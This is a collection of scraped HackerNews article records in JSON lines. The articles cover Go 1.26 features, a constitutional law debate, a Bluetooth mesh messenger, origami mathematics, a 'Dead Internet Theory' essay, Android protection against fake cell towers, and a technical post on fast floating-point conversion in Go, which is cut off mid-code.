{"title": "Go 1.26 Interactive Tour", "url": "https://antonz.org/go-1-26/", "content": "Go 1.26 Interactive Tour. Go 1.26 is coming out in February, so it's a good time to explore what's new. The officialrelease notesare pretty dry, so I prepared an interactive version with lots of examples showing what has changed and what the new behavior is. Read on and see! new(expr)•Recursive type constraints•Type-safe error checking•Green Tea GC•Faster cgo and syscalls•Faster memory allocation•Vectorized operations•Secret mode•Reader-less cryptography•Hybrid public key encryption•Goroutine leak profile•Goroutine metrics•Reflective iterators•Peek into a buffer•Process handle•Signal as cause•Compare IP subnets•Context-aware dialing•Fake example.com•Optimized fmt.Errorf•Optimized io.ReadAll•Multiple log handlers•Test artifacts•Modernized go fix•Final thoughts This article is based on the official release notes from The Go Authors and the Go source code, licensed under the BSD-3-Clause license. This is not an exhaustive list; see the official release notes for that. I provide links to the documentation (𝗗), proposals (𝗣), commits (𝗖𝗟), and authors (𝗔) for the features described. Check them out for motivation, usage, and implementation details. I also have dedicated guides (𝗚) for some of the features. Error handling is often skipped to keep things simple. Don't do this in production ツ Previously, you could only use thenewbuilt-in with types: Now you can also use it with expressions: If the argumentexpris an expression of type T, thennew(expr)allocates a variable of type T, initializes it to the value ofexpr, and returns its address, a value of type*T. This feature is especially helpful if you use pointer fields in a struct to represent optional values that you marshal to JSON or Protobuf:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Harvard legal scholars debate the state of the U.S. constitution (2025)", "url": "https://www.harvardmagazine.com/social-sciences/is-the-constitution-broken", "content": "Harvard legal scholars debate the state of the U.S. constitution (2025). Social Sciences|September 12, 2025 Is the Constitution Broken? On stage from left: Brandon Terry, Aziz Rana, and Noah Feldman speak in front of The Embrace monument.| PHOTOGRAPH BY LYDIALYLE GIBSON/HARVARD MAGAZINE It has beena rocky year for the U.S. Constitution. Eight months into a fast-moving presidency that legal scholars keep describing as a “constitutional stress test,” the Trump administration’s sweeping assertions of executive power have prompted an unprecedented number of legal challenges, including fromHarvard, accusing it of violating the Constitution. This April,one national poll foundthat two-thirds of Americans were concerned about a constitutional crisis. Yet the nation’s founding document still rates as high as ever, with about nine out of ten people expressing a favorable view. Should they, though? Is the Constitution really up to the task of preserving democracy in this moment? Or is it, as the title of a Wednesday evening discussion asked, “broken”? Two constitutional law scholars—Aziz Rana ’00, Ph.D. ’07, and Harvard Law professor Noah Feldman—debated the answer on Boston Common, seated at the foot ofThe Embrace, the monument to Martin Luther King Jr. and Coretta Scott King. Co-sponsored by the Hutchins Center for African and African American Research, the event was moderated by Loeb associate professor of the social sciencesBrandon Terry. To Rana, a Boston College professor who last year publishedThe Constitutional Bind: How Americans Came to Idolize a Document that Fails Them, the Constitution is, indeed, broken. In fact, he argued, the U.S. constitutional system has “super-charged” the current assault by Trump and his allies on the rights and civil liberties that were expanded during the twentieth century. “There is no way to protect those hard-won achievements—achievements that MLK fought and died for,” Rana said, “without ultimately changing pretty foundational features of the hard-wired components of our constitutional system.” Chief among those hard-wired components, he said, is the Constitution’s focus on states, rather than individual voters, as the basic “representational unit.” That arrangement “shapes all the elements of our electoral and legal system,” Rana said: the House and Senate, the Electoral College, Supreme Court confirmations. And this arrangement is partly why the U.S. Constitution is among the hardest in the world to amend. It doesn’t simply undermine majority rule, he added; the minority it empowers are those who have historically weilded disproportionate influence in the political system. “And what this has meant,” Rana said, “is that across American history, even if you have large-scale majorities—even supermajorities—who commit to these various central principles, like racial equality, like civil liberties, like economic democracy, it’s virtually impossible to actually overcome many of the veto points to make them real.” Feldman, the Frankfurter professor of law, offered a rebuttal that was part philosophy, part pragmatism. “Politics is the art of the possible,” he said, recalling how leaders of the small states had staged a walkout during the 1787 Constitution Convention, threatening to blow up the whole process unless they were granted equal representation in the Senate. Fearing the country would end up with no constitution at all, the large states relented. “So, I’m agreeing with Aziz,” Feldman said, “that state control is the source of many of our problems, and it is a key part of why the Constitution is undemocratic.” But it was the “best available alternative,” and that same strategic thinking, he argued, should guide Americans today, too. Even now, he said, “The Constitution is better than any alternative available to us in the real world.” Feldman cited another reason to defend the Constitution: It “has the capacity to evolve and change.” In 1919, he explained, Supreme Court Justice Oliver Wendell Holmes Jr. “basically invented modern free speech law,” establishing, in a series of opinions, the now-fundamental concept that free expression should be permitted unless it poses a clear danger to others. “He understood that the Constitution had to evolve,” Feldman said.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "A decentralized peer-to-peer messaging application that operates over Bluetooth", "url": "https://bitchat.free/", "content": "A decentralized peer-to-peer messaging application that operates over Bluetooth. bitchat is a decentralized peer-to-peer messaging application that operates over bluetooth mesh networks.\nno internet required, no servers, no phone numbers. traditional messaging apps depend on centralized infrastructure that can be monitored, censored, or disabled.\nbitchat creates ad-hoc communication networks using only the devices present in physical proximity.\neach device acts as both client and server, automatically discovering peers and relaying messages across multiple hops to extend the network's reach. this approach provides censorship resistance, surveillance resistance, and infrastructure independence.\nthe network remains functional during internet outages, natural disasters, protests, or in regions with limited connectivity. ios/macos version:appstore:bitchat meshsource code:https://github.com/permissionlesstech/bitchatsupports ios 16.0+ and macos 13.0+. build using xcode with xcodegen or swift package manager. android version:play store:bitchatsource code:https://github.com/permissionlesstech/bitchat-androidapk releases:https://github.com/permissionlesstech/bitchat-android/releasessupports android 8.0+ (api 26). full protocol compatibility with ios version. technical whitepaper:whitepaper.md the software is released into the public domain.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Folding NASA Experience into an Origamist's Toolkit (2024)", "url": "https://spinoff.nasa.gov/Folding_NASA_Experience_into_an_Origamist%E2%80%99s_Toolkit", "content": "Folding NASA Experience into an Origamist's Toolkit (2024). What does origami have in common with electronics? Here, math once again proves to be a universal language, spanning not just cultures but disciplines. The discovery of the mathematical underpinnings of folded paper art helped Robert Lang leave a 20-year engineering career, including over four years at NASA’s Jet Propulsion Laboratory in Southern California, to pursue his lifelong passion for turning paper into impossibly intricate three-dimensional forms. “Over the years of solving mathematical problems to describe lasers and optoelectronics, I built up a toolkit to use as I worked on a hobby basis on this problem of computational origami design,” said Lang. The Altadena, California-based artist holds dozens of patents for optoelectronics — technology that combines light and electricity — but after years of innovating in both fields, the tools he designed for origami are the ones he chose to move ahead with. In the Microdevices Laboratory at JPL in the late 1980s and early ’90s, Lang worked on integrating components like semiconductor lasers and spatial light modulators onto chips, with the ultimate goal of building an optical computer — one that uses light, rather than electricity, to transmit information and carry out calculations. Steady advances in electronic computing have since removed some of the incentives to develop optical computers. “One of the theoretical fields I learned about at JPL turned out to be the key to being able to plug in a description of a shape you wanted and then find the best possible design in great detail — every single crease you needed to make that shape,” said Lang. “And that turned out to be nonlinear constrained optimization.” It’s All About the Numbers A simple nonlinear constrained optimization problem would be the challenge of packing several different-sized balls into the smallest possible box, Lang explained. The constraint is that the balls can’t overlap each other, and the solutions are nonlinear because the balls can be any distance from each other. The optimization is in making the box as small as possible. Designing lasers and other components required a similar calculation to minimize energy consumption, the amount of semiconductor material, and other costs, said Lang. In origami, he said, optimization means creating the largest form possible out of a given sheet of paper. Design begins with mapping the points on that sheet that will become features like a head and limbs. “I found there was an equation that said the distance between any of those two points had to be greater than or equal to a mathematical function that related to where they were in the shape I was after,” Lang said. “And that was really the breakthrough, was figuring out how to mathematically describe that constraint for every possible pair of points in the crease patterns.” The math was too complex to solve by hand but easy for a computer to resolve using known algorithms. The ability to put the problem into accurate mathematical terms “lets you tap into all of the existing mathematics and computer techniques to solve it,” Lang said.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: A creative coding library for making art with desktop windows", "url": "https://github.com/willmeyers/window-art", "content": "Show HN: A creative coding library for making art with desktop windows", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Dead Internet Theory", "url": "https://kudmitry.com/articles/dead-internet-theory/", "content": "Dead Internet Theory. The other day I was browsing my one-and-only social network — which is not a social network, but I’m tired of arguing with people online about it —HackerNews.\nIt’s like this dark corner of the internet, where anonymous tech-enthusiasts, scientists, entrepreneurs, and internet-trolls, like to lurk.\nI like HackerNews.\nIt helps me stay up-to-date about recent tech news (likeCloudflare acquiring Astrowhich makes me happy for the Astro team, but also sad and worried since I really like Astro, and big-tech has a tendency to ruin things); itmostlyavoids politics; and it’s not a social network. And, in the fashion of HackerNews, I stumbled upon someone sharing their open-source project.\nIt’s great to see people work on their projects and decide to show them to the world.\nI think people underestimate the fear of actually shipping stuff, which involves sharing it with the world. Upon glancing at the comment section, I started to see other anonymous participants questioning the validity of said open-source project in terms of how much of it was AI-generated.\nI grabbed my popcorn, and started to follow this thread.\nMore accusations started to appear: the commit timeline does not make sense; the code has AI-generated comments; etc.\nAnd at the same time, the author tried to reply to every comment claiming that they wrote this 100% without using AI. I don’t mind people using AI to write code, even though I tried to resist it myself, until eventually succumbing to it.\nBut I think it’s fair to disclose the use of AI, especially in open-source software.\nPeople on the internet are, mostly, anonymous, and it’s not always possible to verify the claims or expertise of particular individuals.\nBut as the amount of code is growing, considering that everyone is using AI to generate whatever-app they want, it’s impossible to verify every piece of code we are going to use.\nSo it’s fair to know, I think, if some project is AI generated and to what extent.\nIn the end, LLMs are just probabilistic next-token generators.\nAnd while they are getting extremely good at most simple tasks, they have the potential to wreak havoc with harder problems or edge-cases (especially if there are no experienced engineers, with domain knowledge, to review the generated code). As I was following this thread, I started to see a pattern: the comments of the author looked AI generated too: I was sitting there, refreshing the page, seeing the author being confronted with use of AI in both their code and their comments, while the author claiming to have not used AI at all.\nHonestly, I was thinking I was going insane.\nAm I wrong to suspect them?\nWhat if people DO USE em-dashes in real life?\nWhat if English is not their native language and in their native language it’s fine to use phrases like “you are absolutely right”?\nIs this even a real person?\nAre the people who are commenting real? And then it hit me.\nWe have reached theDead Internet.\nThe Dead Internet Theory claims that since around 2016 (a whooping 10 years already), the internet is mainly dead, i.e. most interactions are between bots, and most content is machine generated to either sell you stuff, or game the SEO game (in order to sell you stuff). I’mashamedproud to say that I spent a good portion of my teenage years on the internet, chatting and learning from real people who knew more than me.\nBack in the early 2000s, there were barely bots on the internet.\nThe average non-tech human didn’t know anything about phpBB forums, and the weird people with pseudonyms who hanged-out in there.\nI spent countless hours inside IRC channels, and on phpBB forums, learning things like network programming, OS-development, game-development, and of course web-development (which became my profession for almost two decades now).\nI’m basically a graduate of the Internet University.\nBack then, nobody had doubts that they were talking to a human-being.\nSure, you could think that you spoke to a hot girl, who in reality was a fat guy, but hey, at least they were real! But today, I no longer know what is real.\nI saw a picture on LinkedIn, from a real tech company, posting about their “office vibes” and their happy employees.\nAnd then I went to the comment section, and sure enough this picture is AI generated (mangled text that does not make sense, weird hand artifacts).\nIt was posted by an employee of the company, it showed other employees of said company, and it was altered with AI to showcase a different reality.\nHell, maybe the people on the picture do not even exist! And these are mild examples.\nI don’t use social networks (and no, HackerNews isnota social network), but I hear horror stories about AI generated content on Facebook, Xitter, TikTok, ranging from photos of giants that built the pyramids in Egypt, all the way to short videos of pretty girls saying that the EU is bad for Poland.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "There's a hidden Android setting that spots fake cell towers", "url": "https://www.howtogeek.com/theres-a-hidden-android-setting-that-spots-fake-cell-towers/", "content": "There's a hidden Android setting that spots fake cell towers. Most people never give a second thought to how their phone connects to a cell tower. It’s something that constantly happens in the background without our input, and therein lies the potential for trouble. What if that tower isn't what it seems? Android can tell you about it—maybe. Let’s get the scary stuff out of the way first. “Stingrays,” technically known as IMSI (international mobile subscriber identity) catchers, are devices primarily used for surveillance. They mimic cell towers and act as a middleman between your phone and the network. Once your device is tricked into connecting to what it believes to be a real cell tower, the attacker can harvest device information and force your phone onto an older, unencrypted protocol. This is what allows them to listen to your calls or read your texts without you ever knowing something is wrong. It’s also possible for the attacker to harvest information from the phones of people nearby when this happens. While Stingrays have been used by law enforcement agencies for years to track suspects, it’s now much easier for malicious individuals to get their hands on them and skim data from innocent people. You might think that switching from Facebook Messenger to old-fashioned text messages would help protect your privacy. But standard SMS text messages aren't very private or secure. SMS is like fax---an old, outdated standard that refuses to go away. The good news is that Google has been slowly building a wall against these attacks—emphasis on “slowly.” In 2021, Google released Android 12 with the ability to disable 2G connectivity. Stringrays like this network for its weak security. Two years later, it announced that Android 14 would support disabling an old form of encryption that makes it easy to intercept SMS and calls. Then Android 15 addressed Stingrays with the ability to notify the OS when a network requests your identifiers or forces you onto a less secure encryption method. That brings us up to Android 16—thelatest version. While all of those aforementioned features sounded great at the time, only one was actually available before last year:disabling 2G connectivity. The hold-up is due to the fact that software can only do so much. For these security features to work, your phone's modem has to be able to communicate with the Android OS in a very specific way, and that’s just not something many Android phones have right now. Because of this hardware requirement, the full suite of these network security tools is currently exclusive to the Pixel 10 series. They can be found under the “Mobile Network Security” section in the system settings. Even if you have a brand new Galaxy S25 running One UI 8/Android 16, you probably only have access to the 2G toggle (shown above). It’s better than nothing, but it’s not the complete picture. If you do happen to use a Pixel 10, it’s very easy to enable the extra network security. Google doesn’t enable them by default. Open the Settings and navigate to Security & privacy > More security & privacy > Mobile network security. Inside, you’ll see two toggles: Should one of the scenarios mentioned in “Network notifications” occur, you’llget an alertthat says you’ve connected to an unencrypted network and your data is vulnerable. Alerts can also tell you if your device’s information was recorded, including the time it happened and how often it’s been happening. These notifications can be invaluable in protecting yourself, and enabling them is more important than ever. It’s unfortunate that the vast majority of Android devices still only have the 2G toggle. The Pixel 10 series was released late last year, so hopefully 2026 brings more Android phones that ship with the required hardware for the Mobile Network Security suite. Fake cell towers may sound like something from a spy movie, but it’s the reality we live in.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Floating-Point Printing and Parsing Can Be Simple and Fast", "url": "https://research.swtch.com/fp", "content": "Floating-Point Printing and Parsing Can Be Simple and Fast. A floating point numberfhas the formf=m·2ewheremis called themantissaandeis a signed integerexponent.\nWe like to read numbers scaled by powers of ten,\nnot two, so computers need algorithms to convert binary floating-point\nto and from decimal text.\nMy 2011 post “Floating Point to Decimal Conversion is Easy”\nargued that  these conversions can be simple as long as you\ndon’t care about them being fast.\nBut I was wrong: fast converters can be simple too,\nand this post shows how.The main idea of this post is to implementfast unrounded scaling,\nwhich computes an approximation tox·2e·10p,\noften in a single 64-bit multiplication.\nOn that foundation\nwe can build nearly trivial printing and parsing algorithms that run very fast.\nIn fact, the printing algorithms\nrun faster than all other known algorithms,\nincluding\nDragon4 [30],\nGrisu3 [23],\nErrol3 [4],\nRyū [2],\nRyū Printf [3],\nSchubfach [12],\nand Dragonbox [17],\nand the parsing algorithm runs faster than\nthe Eisel-Lemire algorithm [22].\nThis post presents both the algorithms and a concrete implementation in Go.\nI expect some form of this Go code to ship in Go 1.27 (scheduled for August 2026).This post is rather long—far longer than the implementations!—so here is a brief overview of the sections\nfor easier navigation and understanding where we’re headed.“Fixed-Point and Floating-Point Numbers”\nbriefly reviews fixed-point and floating-point numbers,\nestablishing some terminology and concepts needed for the rest of the post.“Unrounded Numbers” introduces the idea of unrounded numbers,\ninspired by the IEEE754 floating-point extended format.“Unrounded Scaling” defines the unrounded scaling primitive.“Fixed-Width Printing” formats floating-point numbers\nwith a given (fixed) number of decimal digits, at most 18.“Parsing Decimals” parses decimal numbers of\nat most 19 digits into floating-point numbers.“Shortest-Width Printing” formats floating-point numbers\nusing the shortest representation that parses back to the original number.“Fast Unrounded Scaling” reveals the\nshort but subtle implementation of fast unrounded scaling\nthat enables those simple algorithms.“Sketch of a Proof of Fast Scaling” briefly sketches the proof\nthat the fast unrounded scaling algorithm is correct.\nA companion post, “Fast Unrounded Scaling: Proof by Ivy”\nprovides the full details.“Omit Needless Multiplications” uses a key idea from the proof\nto optimize the fast unrounded scaling implementation further,\nreducing it to a single 64-bit multiplication in many cases.“Performance” compares the performance of the\nimplementation of these algorithms against earlier ones.“History and Related Work” examines the history of\nsolutions to the floating-point printing and parsing problems\nand traces the origins of the specific ideas used in this\npost’s algorithms.For the last decade, there has been a new algorithm for floating-point printing and parsing\nevery few years.\nGiven the simplicity and speed of the algorithms in this post\nand the increasingly small deltas between successive algorithms,\nperhaps we are nearing an optimal solution.Fixed-Point and Floating-Point NumbersFixed-point numbers have the formf=m·Befor an integer mantissam, constant baseB, and constant (fixed) exponente.\nWe can create fixed-point representations\nin any base, but the most common are base 2 (for computers)\nand base 10 (for people).\nThis diagram shows fixed-point numbers at various scales\nthat can represent numbers between 0 and 1:Using a smaller scaling factor increases precision\nat the cost of larger mantissas.\nWhen representing very large numbers, we can use\nlarger scaling factors to reduce the mantissa size.\nFor example, here are various representations of\nnumbers around one billion:Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// 